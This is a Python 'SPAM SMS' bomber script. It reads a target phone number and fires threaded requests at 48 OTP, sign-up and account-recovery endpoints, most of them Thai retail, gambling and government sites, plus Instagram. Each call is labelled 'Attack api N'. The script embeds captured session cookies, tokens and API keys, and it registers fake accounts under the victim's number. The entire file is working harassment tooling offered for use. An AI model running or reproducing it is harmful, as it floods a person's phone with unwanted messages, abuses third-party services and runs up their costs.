import requests
import time,os,sys
import random
import threading
from threading import Thread
from os import system
from time import sleep

format_one = 0
format_two = 0
format_tre = 0

loop_types = 1


def customx_color():
    global format_one, format_two, format_tre, loop_types

    for types1, types2, types3, number in zip([1, 0], [0, 1], ['+', '-'], [255, 0]):
        if (loop_types == types1):
            if (format_one != number):
                exec(f'format_one {types3}= 15', globals())

            if (format_one == number):
                if (format_two != number):
                    exec(f'format_two {types3}= 15', globals())
                    
            if (format_two == number):
                if (format_tre != number):
                    exec(f'format_tre {types3}= 15', globals())

            if (format_tre == number):
                loop_types = types2
    
    return f"\033[38;2;{format_one};{format_two};{format_tre}m"
system('clear')
print("""


			   ███████╗██████╗  █████╗ ███╗   ███╗    ███████╗███╗   ███╗███████╗
			   ██╔════╝██╔══██╗██╔══██╗████╗ ████║    ██╔════╝████╗ ████║██╔════╝
			   ███████╗██████╔╝███████║██╔████╔██║    ███████╗██╔████╔██║███████╗
			   ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║    ╚════██║██║╚██╔╝██║╚════██║
			   ███████║██║     ██║  ██║██║ ╚═╝ ██║    ███████║██║ ╚═╝ ██║███████║
			   ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝    ╚══════╝╚═╝     ╚═╝╚══════╝
                                                                  

""")
phone = input("Number >> ")
amount = int(input("Amount >> "))
time.sleep(1)
print(f"attack : {phone} start. ")
time.sleep(1)
system("clear")

def api1():
	requests.post("https://kaspy.com/sms/sms.php/",data=f"phone={phone}",headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","Cookie": "PHPSESSID=2i484jdb1pie5am071cveupme5; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; form_key=rUt4Q17TiRlUfgKz; _ga=GA1.2.1486915122.1646803642; _gid=GA1.2.1348564830.1646803642; _fbp=fb.1.1646803643605.1538052508; mage-messages=; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; smartbanner_exited=1; __atuvc=2%7C10; __atuvs=62283aaa77850300001; _gat=1; private_content_version=382c8a313cac3cd587475c1b3693672e; section_data_ids=%7B%22cart%22%3A1646803701%2C%22customer%22%3A1646803701%2C%22compare-products%22%3A1646803701%2C%22last-ordered-items%22%3A1646803701%2C%22directory-data%22%3A1646803701%2C%22captcha%22%3A1646803701%2C%22instant-purchase%22%3A1646803701%2C%22persistent%22%3A1646803701%2C%22review%22%3A1646803701%2C%22wishlist%22%3A1646803701%2C%22chatData%22%3A1646803701%2C%22recently_viewed_product%22%3A1646803701%2C%22recently_compared_product%22%3A1646803701%2C%22product_data_storage%22%3A1646803701%2C%22paypal-billing-agreement%22%3A1646803701%2C%22messages%22%3A1646803708%7D"})
	print(customx_color() + 'Attack api 1')
	
def api2():
	requests.get(f"https://www.scgexpress.co.th/member/getRegister?phone={phone}")
	print(customx_color() + 'Attack api 2')
	
def api3():
	requests.post('https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp',headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Cookie": "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1DJVRCMPpP8QtZsF5yDyw6ibCMf2HXs95LvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkLd3Q7qnZoSNBL8y9wge8Lt7grySdVLFhw9HB68dTSiOm1K04QhdrprI7EsTLWDHTgYmgyTQDuz63YjHsH5MUVanlfBISU1WXmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"},data=f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER")
	print(customx_color() + 'Attack api 3')
	
def api4():
	requests.post("https://www.instagram.com/accounts/account_recovery_send_ajax/",data=f"email_or_username={phone}&recaptcha_challenge_field=",headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","x-csrftoken": "EKIzZefCrMss0ypkr2VjEWZ1I7uvJ9BD"}).json
	print(customx_color() + 'Attack api 4')
	
def api5():
	requests.post("https://user-api.learn.co.th/authentication/sendOTP",json={"mobileNumber": f"{phone}"},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","Host": "user-api.learn.co.th","content-length": "29","sec-ch-ua-mobile": "?1","content-type": "application/json;charset=UTF-8","accept": "application/json, text/plain, */*","sec-ch-ua-platform": "Android","origin": "https://user.learn.co.th","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://user.learn.co.th/","x-api-key": "USER_API_KEY"})
	print(customx_color() + 'Attack api 5')
	
def api6():
	requests.post("https://www.msport1688.com/auth/send_otp", data={"phone":phone})
	print(customx_color() + 'Attack api 6')
	
def api7():
	requests.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={"username": phone})
	print(customx_color() + 'Attack api 7')
	
def api8():
	requests.post("http://b226.com/x/code", data={f"phone":phone})
	print(customx_color() + 'Attack api 8')

def api9():
	print(customx_color() + 'Attack api 9')
	requests.post("http://b226.com/x/code", data={f"phone":phone})
    
def api10():
	requests.post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", json={"on":{"value":phone,"country":"66"},"type":"mobile"})
	print(customx_color() + 'Attack api 10')

def api11():
	requests.post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", json={"on":{"value":phone,"country":"66"},"type":"mobile"})
	print(customx_color() + 'Attack api 11')
	
def api12(): 
	requests.post("https://vaccine.trueid.net/vacc-verify/api/getotp",json={"msisdn":phone,"function":"enroll"},headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})
	print(customx_color() + 'Attack api 12')
	
def api13():
	requests.post("https://bkgame.bet/env/authen.php?requestotp", data=f"phone_number={phone}",headers={"content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"})
	print(customx_color() + 'Attack api 13')
	
def api14():
	requests.get(f"https://findclone.ru/register?phone=+66{phone[1:]}",headers={"X-Requested-With" : "XMLHttpRequest","User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36"}).json()
	print(customx_color() + 'Attack api 14')
	
def api15():
	requests.post("https://prettygaming168-api.auto888.cloud/api/v3/otp/send", data = {"tel":phone,"otp_type":"register"}, headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36"}, proxies = {"http": "http://182.52.103.144:8080"})
	print(customx_color() + 'Attack api 15')
	
def api16():
	requests.post("https://www.fox888.com/api/otp/register", data = "applicant="+phone+"&serviceName=FOX888", headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Accept": "*/*", "X-Requested-With": "XMLHttpRequest"})
	print(customx_color() + 'Attack api 16')
	
def api17():
	requests.post("https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp", data={"mobile_phone_no":phone})
	print(customx_color() + 'Attack api 17')
	
def api18():
	requests.get(f"https://api.joox.com/web-fcgi-bin/web_account_manager?optype=5&os_type=2&country_code=66&phone_number={phone}&time=1641777424446&_=1641777424449&callback=axiosJsonpCallback2")
	print(customx_color() + 'Attack api 18')
	
def api19():
	requests.post("https://queenclub88.com/api/register/phone", data={"phone":phone})
	print(customx_color() + 'Attack api 19')
	
def api20():
	requests.post("https://store.boots.co.th/api/v1/guest/register/otp",json={"phone_number": phone})
	print(customx_color() + 'Attack api 20')
	
def api21():
	requests.post("https://m.lavagame168.com/api/register-otp",headers={"x-exp-signature": "5ffc0caa4d603200124e4eb1","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","referer": "https://m.lavagame168.com/dashboard/login"},json={"brands_id":"5ffc0caa4d603200124e4eb1","agent_register":"5ffc0d5cdcd4f30012aec3d9","tel": phone})
	print(customx_color() + 'Attack api 21')
	
def api22():
	requests.post("https://ep789bet.net/auth/send_otp", data={"phone":f"{phone}"})
	print(customx_color() + 'Attack api 22')
	
def api23():
	requests.post("https://api2.1112.com/api/v1/otp/create",json={"phonenumber":phone,
	    "language": "th"},headers={"accept": "application/json, text/plain, /",
	    "user-agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"})
	print(customx_color() + 'Attack api 23')
	
def api24():
	requests.post("https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code", data={"phone": "0"+phone})
	print(customx_color() + 'Attack api 24')
	
def api25():
	requests.post("https://api.scg-id.com/api/otp/send_otp", headers={"Content-Type": "application/json;charset=UTF-8"},json={"phone_no": "0"+phone})
	print(customx_color() + 'Attack api 25')
	
def api26():
	requests.post("https://api.zaapi.co/api/store/auth/otp/login",json={"phoneNumber":f"+66{phone}","namespace":"zaapi-buyers"},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"})
	print(customx_color() + 'Attack api 26')
	
def api27():
	requests.post("https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/"+"0"+phone)
	print(customx_color() + 'Attack api 27')
	
def api28():
	requests.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username":phone,"password":"1111a1111A","name":phone,"provinceCode":"74","districtCode":"970","subdistrictCode":"8654","zipcode":"94140","siebelCustomerTypeId":"710","locale":"th_TH"},headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})
	print(customx_color() + 'Attack api 28')
	
def api29():
	requests.get("https://api.quickcash8.com/v1/login/captcha?timestamp=1636359633&sign=3a11b88fbf58615099d15639e714afcc&token=&version=2.3.2&appsFlyerId=1636346593405-2457389151564256014&platform=android&channel_str=&phone="+phone+"&img_code=", headers = {"Host": "api.quickcash8.com", "Connection": "Keep-Alive", "Accept": "gzip", "User-Agent": "okhttp/3.11.0"})
	print(customx_color() + 'Attack api 29')
	
def api30():
	requests.post("https://www.monomax.me/api/v2/signup/telno",json ={"password":"12345678+","telno": phone})
	print(customx_color() + 'Attack api 30')
	
def api31():
	requests.post("https://www.qqmoney.ltd/jackey/sms/login",json = {"appId":"5fc9ff297eb51f1196350635","companyId":"5fc9ff12197278da22aff029","mobile": phone},headers={"Content-Type": "application/json;charset=UTF-8"})
	print(customx_color() + 'Attack api 31')
	
def api32():
	requests.post("https://u.icq.net/api/v65/rapi/auth/sendCode", json={"reqId":"39816-1633012470","params":{"phone": phone,"language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}})
	print(customx_color() + 'Attack api 32')
	
def api33():
	requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.SignUp","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/signup/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}","Password":"098098Az","UserAttributes":[{"Name":"name","Value":"Dbdh"},{"Name":"birthdate","Value":"2005-01-01"},{"Name":"gender","Value":"Male"},{"Name":"phone_number","Value":f"+66{phone[1:]}"},{"Name":"custom:phone_country_code","Value":"+66"},{"Name":"custom:is_agreement","Value":"true"},{"Name":"custom:allow_consent","Value":"true"},{"Name":"custom:allow_person_info","Value":"true"}],"ValidationData":[]})
	print(customx_color() + 'Attack api 33')
	
def api34():
	requests.post("https://unacademy.com/api/v3/user/user_check/",json={"phone":phone,"country_code":"TH"},headers={}).json()
	print(customx_color() + 'Attack api 34')
	
def api35():
	requests.get("https://m.redbus.id/api/getOtp?number="+phone[1:]+"&cc=66&whatsAppOpted=true",headers={"traceparent": "00-7d1f9d70ec75d3fb488d8eb2168f2731-6b243a298da767e5-01","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36"}).text
	print(customx_color() + 'Attack api 35')
	
def api36():
	requests.post("https://jdbaa.com/api/otp-not-captcha", data={"phone_number":phone,"user_id":"EMP02","full_name":"Tried Threa"})
	print(customx_color() + 'Attack api 36')
	
def api37():
	requests.post("https://api.myfave.com/api/fave/v3/auth",
	        headers={"client_id": "dd7a668f74f1479aad9a653412248b62"},json={"phone": "66" + phone})
	print(customx_color() + 'Attack api 37')
	
def api38():
	requests.post(f"http://m.vcanbuy.com/gateway/msg/send_regist_sms_captcha?mobile=66-0{phone}")
	print(customx_color() + 'Attack api 38')
	
def api39():
	requests.post("https://api-globalhouse.com/sms/requestOTP",json={"phoneNumber":phone},headers={"content-type": "application/json; charset=utf-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJBUFAtU2VydmljZSIsImlhdCI6MTYxMDgwNjQ0NDQxM30.0BWQpa9RO61bUpI45ncdngikQX0xmy2fwsRtZsZNlCc"}).text
	print(customx_color() + 'Attack api 39')
	
def api40():
	requests.post("https://api-globalhouse.com/sms/requestOTP",json={"phoneNumber":phone},headers={"content-type": "application/json; charset=utf-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJBUFAtU2VydmljZSIsImlhdCI6MTYxMDgwNjQ0NDQxM30.0BWQpa9RO61bUpI45ncdngikQX0xmy2fwsRtZsZNlCc"}).text
	print(customx_color() + 'Attack api 40')
	
def api41():
	requests.post("https://www.carsome.co.th/website/login/sendSMS",json={"username":phone,"optType":0})
	print(customx_color() + 'Attack api 41')
	
def api42():
	requests.post("https://ecomapi.eveandboy.com/v10/user/signup/phone", data={"phone": f"{phone[1:]}","password":"123456789Az"})
	print(customx_color() + 'Attack api 42')
	
def api43():
	requests.post("https://gccircularlivingshop.com/sms/sendOtp", json={"grant_type":"otp","username": "+66"+phone,"password":"","client":"ecommerce"})
	print(customx_color() + 'Attack api 43')
	
def api44():
	requests.post("https://m.lucabet168.com/api/register-otp",json={"brands_id":"609caede5a67e5001164b89d","agent_register":"60a22f7d233d2900110070d7","tel": phone})
	print(customx_color() + 'Attack api 44')
	
def api45():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(customx_color() + 'Attack api 45')
	
def api46():
	requests.post("https://bacara888.com/api/otp/register",data={"applicant":phone,"serviceName":"gclub"})
	print(customx_color() + 'Attack api 46')
	
def api47():
	requests.post("https://bacara888.com/api/otp/register",data={"applicant":phone,"serviceName":"gclub"})
	print(customx_color() + 'Attack api 47')
	
def api48():
	requests.post("https://bacara888.com/api/otp/register",data={"applicant":phone,"serviceName":"gclub"})
	print(customx_color() + 'Attack api 48')

if (amount):
	for i in range(amount):
		threading.Thread(target=api1).start()
	threading.Thread(target=api2).start()
	threading.Thread(target=api3).start()
	threading.Thread(target=api4).start()
	threading.Thread(target=api5).start()
	threading.Thread(target=api6).start()
	threading.Thread(target=api7).start()
	threading.Thread(target=api8).start()
	threading.Thread(target=api9).start()
	threading.Thread(target=api10).start()
	threading.Thread(target=api11).start()
	threading.Thread(target=api12).start()
	threading.Thread(target=api13).start()
	threading.Thread(target=api14).start()
	threading.Thread(target=api15).start()
	threading.Thread(target=api16).start()
	threading.Thread(target=api17).start()
	threading.Thread(target=api18).start()
	threading.Thread(target=api19).start()
	threading.Thread(target=api20).start()
	threading.Thread(target=api21).start()
	threading.Thread(target=api22).start()
	threading.Thread(target=api23).start()
	threading.Thread(target=api24).start()
	threading.Thread(target=api25).start()
	threading.Thread(target=api26).start()
	threading.Thread(target=api27).start()
	threading.Thread(target=api28).start()
	threading.Thread(target=api29).start()
	threading.Thread(target=api30).start()
	threading.Thread(target=api31).start()
	threading.Thread(target=api32).start()
	threading.Thread(target=api33).start()
	threading.Thread(target=api34).start()
	threading.Thread(target=api35).start()
	threading.Thread(target=api36).start()
	threading.Thread(target=api37).start()
	threading.Thread(target=api38).start()
	threading.Thread(target=api39).start()
	threading.Thread(target=api40).start()
	threading.Thread(target=api41).start()
	threading.Thread(target=api42).start()
	threading.Thread(target=api43).start()
	threading.Thread(target=api44).start()
	threading.Thread(target=api45).start()
	threading.Thread(target=api46).start()
	threading.Thread(target=api47).start()
	threading.Thread(target=api48).start()